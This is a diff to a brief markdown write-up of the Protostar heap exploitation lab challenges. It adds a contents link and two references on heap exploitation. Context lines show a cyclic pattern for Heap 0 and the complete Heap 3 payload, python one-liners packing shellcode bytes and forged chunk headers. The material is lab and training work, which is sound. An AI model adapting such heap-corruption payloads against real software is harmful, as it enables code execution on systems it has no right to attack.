@@ -2,6 +2,8 @@
 
 I've noticed that a lot of well documented writeups are present for protostar and decided to instaad post a cliff-notes version for this and upcoming ones. A bunch of useful [References](#references)
 
+test [Heap 3](#heap-\#3)
+
 ### Heap \#0
 Generated good ol' string using pattern_create for 140
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5A6
@@ -55,4 +57,7 @@ Final Payload:
     ./heap3 `python -c 'print "AAAA" + "\xeb\x06" + "\x90"*6 + "\x68\x64\x88\x04\x08\xc3"'` `python -c 'print "B"*16 + "\x01"*4 + "\xff"*4 + "B"*8 + "\xfc\xff\xff\xff" + "\xf0\xff\xff\xff"'` `python -c 'print "CCCC"+"\x1c\xb1\x04\x08"+"\x08\xc0\x04\x08"'`
 
 ## References
+- https://www.thc.org/root/docs/exploit_writing/Exploiting%20the%20wilderness.txt
+- http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html
+
 
